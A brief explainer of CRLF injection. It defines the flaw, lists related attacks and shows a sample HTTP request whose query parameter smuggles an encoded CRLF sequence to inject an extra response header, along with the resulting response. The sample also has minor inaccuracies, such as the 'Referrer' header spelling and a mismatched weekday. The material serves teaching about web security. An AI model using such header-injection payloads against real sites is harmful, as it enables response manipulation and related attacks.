CRLF injection is a vulnerability where an attacker manages to inject a CRLF sequence (carriage return and line feed) into the response, allowing them to manipulate the response body and/or headers.

CRLF injection attacks include:

- HTTP Response Splitting
- HTTP Header Injection
- Memcache Injection
- Server-Side Request Forgery


=== Request
  ```http
  GET /?page=login%0D%0ACustom-Header:%20vulnerable HTTP/1.1
  Host: localhost
  User-Agent: Mozilla/5.0
  Referrer: http://localhost/
  ```

=== Response
  ```http
  HTTP/1.1 200 OK
  Date: Wed, 05 Jan 2024 12:00:00 GMT
  Server: Apache/2.2.31 (Unix)
  Content-Length: 1234
  Content-Type: text/html; charset=UTF-8
  Set-Cookie: page=login
  Custom-Header: vulnerable
  
  <body>
  ```
